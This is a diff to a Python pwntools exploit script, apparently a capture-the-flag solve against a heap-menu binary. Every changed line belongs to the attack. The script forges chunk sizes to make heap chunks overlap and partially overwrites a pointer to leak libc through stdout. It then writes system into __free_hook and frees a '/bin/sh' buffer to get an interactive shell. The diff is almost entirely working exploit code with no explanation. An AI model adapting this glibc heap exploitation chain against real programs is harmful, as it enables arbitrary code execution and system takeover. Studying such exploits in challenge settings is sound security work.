@@ -50,19 +50,13 @@ def delete(io, idx):
 def pwn():
     io = get_io()
 
-    add(io, 0, 0x80)
-    add(io, 1, 0xf0)
-    add(io, 2, 0xf0)
-    add(io, 3, 0xf0)
-    add(io, 4, 0xf0)
-    add(io, 5, 0xf0)
-    add(io, 6, 0xe0)
-    add(io, 7, 0xe0)
+    for i in range(8):
+        add(io, i, 0xf0)
 
-    edit(io, 0, b"A"*0x90+p64(0xffff), "tinyfat")
+    edit(io, 0, b"%256c"+p64(0xffff), "tinyfat")
 
     payload = b"\x00" * 0xf0
-    payload += p64(0x100*4+0xf1)
+    payload += p64(0x100*4+0x101)
     edit(io, 1, b"512", payload) 
     delete(io, 4)
     delete(io, 3)
@@ -76,7 +70,6 @@ def pwn():
     log.success("stdout:-----> " + hex(stdout))
 
     stdout += 0xb000
-    # ddebug(io, "breakrva 0x16c4\ncontinue")
     edit(io, 2, b"a"*0xa0+p64(0x90), "aa")
     edit(io, 3, "100", b"b"*0x58+p16(stdout))
     add(io, 8, 0xf0)
@@ -93,7 +86,7 @@ def pwn():
     delete(io, 8)
     _free_hook = libc.symbols.get("__free_hook", 0)
     edit(io, 3, "100", b"b"*0x58+p64(_free_hook-0x8))
-    ddebug(io, "b malloc\n b free\n")
+    # ddebug(io, "b malloc\n b free\n")
     add(io, 10, 0xf0)
     add(io, 11, 0xf0)
 
@@ -101,7 +94,8 @@ def pwn():
     log.success("system:----->" + hex(system))
     edit(io, 11, "100", p64(system))
     
-    edit(io, 6, b"a"*0xf0+b"/bin/sh\x00", "aa")
+    ddebug(io, "breakrva 0x16c4\ncontinue")
+    edit(io, 6, b"%256c"+b"/bin/sh\x00", "aa")
     delete(io, 7)
 
     io.interactive()
